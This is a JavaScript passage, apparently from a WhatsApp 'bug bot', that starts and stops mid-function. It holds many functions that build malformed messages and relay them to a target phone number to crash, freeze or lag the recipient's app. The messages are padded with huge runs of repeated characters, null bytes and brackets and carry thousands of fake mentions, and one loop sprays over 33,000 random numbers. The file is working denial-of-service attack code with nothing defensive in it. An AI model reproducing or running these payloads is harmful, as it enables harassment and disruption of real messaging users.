    const msg = generateWAMessageFromContent(target, MSG, {});
    
    const targets = [
        "status@broadcast",
        target,
        ...Array.from({ length: 33333 }, () => 
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
        )
    ];

    for (const targetId of targets) {
        try {
            await sock.relayMessage(targetId, msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined
                                    },
                   
                                    ...Array.from({ length: 100 }, (_, i) => ({
                                        tag: "user",
                                        attrs: { id: i },
                                        content: TrigerMsg
                                    }))
                                ]
                            }
                        ]
                    },
                    {
                        tag: "payload",
                        attrs: { size: "huge" },
                        content: TrigerMsg
                    }
                ]
            });

            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
            console.error("Error sending to", targetId, ":", e);
        }
    }

    if (target) {
        for (let i = 0; i < 5; i++) {
            try {
                await sock.relayMessage(
                    target,
                    {
                        statusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                    editedMessage: {
                                        protocolMessage: {
                                            key: msg.key,
                                            type: 25,
                                            editedMessage: {
                                                textMessage: {
                                                    text: TrigerMsg
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { 
                                    is_status_mention: "EelanggaOfficial Bug Delay Activited " + TrigerMsg,
                                    iteration: i
                                },
                                content: [
                                    ...Array.from({ length: 50 }, (_, j) => ({
                                        tag: "mention",
                                        attrs: { id: j },
                                        content: TrigerMsg
                                    }))
                                ]
                            }
                        ]
                    }
                );

                await new Promise(resolve => setTimeout(resolve, 200));
            } catch (e) {
                console.error("Error in status mention", i, ":", e);
            }
        }
    }

    console.log("Enhanced Lixxdelay executed successfully!");
}

async function FireBread(target, mention) {
  let hell = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Xatanical", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  await sock.relayMessage("status@broadcast", hell.message, {
    messageId: hell.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: { protocolMessage: { key: hell.key, type: 25 } }
    }
  }, {
    additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
  });
  let stickerMessage = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 400 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };
  const msg = await generateWAMessageFromContent(target, stickerMessage, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  console.log(chalk.red('Send Bug sukses'));
  try {
    const ButtonMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
            mimetype: "application/was",
            height: 9999999999,
            width: 999999999,
            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
            fileLength: 9999999,
            pngThumbnail: Buffer.alloc(0),
            mediaKeyTimestamp: 1757601173,
            isAnimated: true
          }
        }
      }
    };

    await sock.relayMessage(target, ButtonMsg.viewOnceMessage.message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    });

    let PaymentMsg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Bro", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "payment_info",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });

    await sock.relayMessage("status@broadcast", PaymentMsg2.message, {
      messageId: PaymentMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    if (PaymentMsg2) {
      await sock.relayMessage(target, {
        groupStatusMentionMessageV2: { message: { protocolMessage: { key: PaymentMsg2.key, type: 25 } } }
      }, {});
    }
  } catch (e) {
    console.error(e);
  }
}

async function AudioParams(sock, target, mention = true) {
  try {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "Hallo Sayang", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);
  } catch (err) {
    console.error("⚠️ Error AudioParams:", err.message);
  }
}

async function LocX(target) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}

async function blankButton(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "ꦽ".repeat(20000),
                            hasMediaAttachment: true,
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: -0,
                            },
                        },
                        body: {
                            text: "omak lari ada Farid" + "ꦽ".repeat(40000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ status: true }),
                                },
                                {
                                    name: "send_location",
                                    buttonParamsJson: JSON.stringify({ status: true }),
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        id: "reply_quick",
                                    }),
                                },
                                {
                                    name: "open_url",
                                    buttonParamsJson: JSON.stringify({
                                        url: "https://example.com",
                                    }),
                                },
                                {
                                    name: "share_contact",
                                    buttonParamsJson: JSON.stringify({
                                        contact_id: "6281234567890@s.whatsapp.net",
                                    }),
                                },
                                {
                                    name: "view_profile",
                                    buttonParamsJson: JSON.stringify({
                                        id: "profile_view",
                                    }),
                                },
                            ],
                        },
                    },
                },
            },
        },
        {
            messageId: null,
            participant: { jid: target },
        },
    );
}

async function Document(sock, target) {
  const docu = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Don't be afraid of haters because haters are people who have lost in the competition." + "ꦽ".repeat(70000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "./AmeliaMldder",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "Https://Amelia"
          },
          contextInfo: {
             remoteJid: "status@broadcast",
             participant: "6281933605296@s.whatsapp.net",
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },              
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "Https://Amelia",
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(docu), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function DelayInvisible(sock, target) {
  try {
    const PhoenixMessage = {
      extendedTextMessage: {
        text: "ꦽ".repeat(15000) + "Kode promo " + "ꦽ".repeat(15000),
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 500 }, () => 
              `62${Math.floor(1000000000 + Math.random() * 9000000000)}@s.whatsapp.net`
            )
          ],
          forwardingScore: 9999,
          isForwarded: true,
          quotedMessage: {
            productMessage: {
              product: {
                productId: "Phoenix_product_" + Date.now(),
                title: "ꦽ".repeat(8000),
                description: "X".repeat(25000),
                priceAmount1000: "999999999",
                url: "https://example.com/" + "x".repeat(8000),
                productImageCount: 999,
                contextInfo: {
                  mentionedJid: Array.from({ length: 300 }, () => 
                    `1${Math.floor(1000000000 + Math.random() * 9000000000)}@s.whatsapp.net`
                  )
                }
              }
            }
          }
        },
        canonicalUrl: "https://" + "y".repeat(15000) + ".com"
      }
    };

    const generatedMessage = await sock.generateWAMessageFromContent(
      target,
      exploitMessage,
      { userJid: sock.user?.id || target }
    );

    await sock.relayMessage(target, generatedMessage.message, {
      messageId: generatedMessage.key.id
    });

  } catch (error) {
    await sock.sendMessage(target, {
      text: "ꦽ".repeat(8000),
      mentions: [target, ...Array.from({ length: 100 }, () => target)]
    });
  }
}

async function uiandro(target) {
  return new Promise(async (resolve) => {
    let memek = "ꦽ".repeat(1000);
    let ProtoSock = JSON.stringify({
      type: "invoke",
      payload: {
        bot_id: "meta_ai",
        action: "send_card",
        recipient: {
          phone_number: target,
          name: "Meta AI"
        },
        card_data: {
          template_id: "show_cards_users",
          components: [
            {
              type: "header",
              parameters: {
                title: "",
                image: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0&mms3=true"
                }
              }
            },
            {
              type: "body",
              parameters: {
                text: "",
                variables: {
                  name: "ctp",
                  offer_code: "SHA_256"
                }
              }
            },
            {
              type: "button",
              parameters: [
                {
                  type: "single_select",
                  button_id: "btn_accept",
                  text: ""
                },
                {
                  type: "highlight_label",
                  button_id: "btn_decline",
                  text: ""
                }
              ]
            }
          ]
        },
        metadata: {
          request_id: "REQUEST_BY_OTHER",
          timestamp: null,
          source: "com.whatsapp"
        }
      }
    });

    let content = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            shop: 999,
            participant: { jid: target },
            remoteJid: "status@broadcast",
            expiration: 999,
            ephemeralSettingTimestamp: 100000,
            entryPointConversionSource: "cache",
            entryPointConversionApp: "Whatsapp",
            entryPointConversionDelaySeconds: 9670,
            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_STATUS"
            }
          },
          interactiveMessage: {
            header: {
              title: " -ritz { 1st } " + memek,
              hasMediaAttachment: false
            },
            body: {
              text: "Lixx but"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net"
              },
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{             1.}"
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: ProtoSock
                },
                {
                  name: "payment_info",
                  buttonParamsJson: "{\"currency\":\"USD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-xrelly\"}"
                },
                {
                  name: "account_type",
                  buttonParamsJson: ProtoSock
                }
              ]
            }
          }
        }
      }
    },
    { isAnimated: true }
  );

    await sock.relayMessage(target, content.message, {
      messageId: null,
      participant: { jid: target }
    });

    setTimeout(() => resolve(), 1000);
  });
}

async function XanninCrasher(sock, target) {
  try {
    const Xannarr = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false,
              title: "justScary\n\n" + "ꦽ".repeat(50000),
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              name: "single_select",
              messageParamsJson: "",
            },
            payment: {
              name: "galaxy_message",
              messageParamsJson: JSON.stringify({
                icon: "DOCUMENT",
                flow_cta: "\\u0000",
                flow_message_version: "3",
              }),
            },
          },
        },
      },
      body: {
        text: "Lixx prime",
        nativeFlowMessage: {
          messageParamsJson: "[{".repeat(50000),
          buttons: [
            {
              name: "mpm",
              buttonParamsJson: "\u0000".repeat(50000),
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ྀ".repeat(50000),
                sections: [
                  {
                    title: "ྀ".repeat(50000),
                    rows: [],
                  },
                ],
              }),
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({ status: "1" }),
            },
            {
              name: "call_permission_request",
              buttonParamsJson: "[{".repeat(50000),
            },
          ],
        },
      },
    };

    const msg = await generateWAMessageFromContent(target, Xannarr, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log(
      chalk.greenBright(`BERHASIL MENGIRIM PESAN KE Target : ${target}`)
    );
  } catch (err) {
    console.error(chalk.red.bold(err));
  }
}

async function VampDelayAudio(target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "sayang" + "ោ៝".repeat(10000),
      title: "maklu",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "Huwaaaaa...",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        mentionedJid: mentionedList
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "maklu"
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      annotations: [
        {
          embeddedContent: {
            embeddedMusic
          },
          embeddedAction: true
        }
      ]
    };

    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: { videoMessage }
      }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error(err);
  }
  console.log(chalk.red(`suckin Audio - Delay to ${target}`));
}

async function BlankScreen(sock, target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";

   
    const imagePayload = await prepareWAMessageMedia(
      {
        image: { url: ThumbRavage, gifPlayback: true },
      },
      { upload: sock.waUploadToServer }
    );

   
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                mentionedJid: Array.from({ length: 3000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                isForwarded: true,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363331859075083@newsletter",
                  newsletterName: "ꦾ".repeat(1000),
                  serverMessageId: 1,
                },
              },
              header: {
                title: "",
                hasMediaAttachment: true,
                ...imagePayload,
              },
              body: {
                text: "\u2063".repeat(5000),
              },
              footer: {
                text: "you know faridz?",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "Marga #895 New Era",
                    buttonParamsJson: JSON.stringify({
                      display_text: "ꦾ".repeat(1000),
                      url: "https://example.com",
                      merchant_url: "",
                    }),
                  },
                  {
                    name: "name_message",
                    buttonParamsJson: JSON.stringify({
                      screen_1_TextInput_0: "radio" + "\0".repeat(1000),
                      screen_0_Dropdown_1: "Null",
                      flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
                    }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      }),
      {}
    );

    
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`✅ BlankScreen sent to ${target}`);
  } catch (err) {
    console.error("❌ Error in BlankScreen:", err);
  }
}
  
async function frezeeClick(sock, target) {
  const zieeMsg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: false,
        title: "Excellent, I Found Ziee :D"
      },
      body: { text: "\x10" },
      footer: { text: "\x10" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              url: "https://"+"𑜦𑜠".repeat(10000)+".com"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              copy_code: "𑜦𑜠".repeat(10000)
            })
          }
        ],
        messageParamsJson: JSON.stringify({})
      }
    }
  };

  try {
    await sock.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}

async function BullSedotKuota(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
